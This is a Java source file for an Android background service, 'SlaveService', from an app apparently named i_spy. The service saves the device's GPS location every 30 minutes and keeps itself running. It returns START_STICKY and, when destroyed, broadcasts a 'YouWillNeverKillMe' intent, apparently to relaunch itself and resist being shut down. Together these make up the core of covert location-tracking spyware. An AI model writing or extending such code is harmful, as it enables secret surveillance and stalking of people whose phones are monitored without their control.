package com.um.asn.i_spy.services;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.os.Handler;
import android.support.annotation.Nullable;

import com.um.asn.i_spy.listeners.ConnectionListener;
import com.um.asn.i_spy.models.Phone;
import com.um.asn.i_spy.models.PositionGPS;

public class SlaveService extends IntentService {

    private final long TIME_BETWEEN_GET_DATA_GPS_MS = 1000 * 60 * 30;
    private Handler handler = new Handler();
    private Phone phone;

    private final Runnable getGPS = new Runnable(){
        public void run(){
            try {
                System.out.println("Clock : try save Position");

                PositionGPS posGPS = new PositionGPS(getApplicationContext(), phone);
                posGPS.saveLocation((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE));

                handler.postDelayed(this, TIME_BETWEEN_GET_DATA_GPS_MS);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
    };

    public SlaveService() {
        super("SlaveService");
    }

    public void getPhone() {
        phone = new Phone();
        phone.loadWithFile(getApplicationContext());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Pour enregistrer l'eventListner sur les changements de connexion (car deprecated dans Nougat)
        registerReceiver(new ConnectionListener(), new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION));
        getPhone();
        handler.post(getGPS);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        sendBroadcast(new Intent("YouWillNeverKillMe"));
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        return;
    }
}
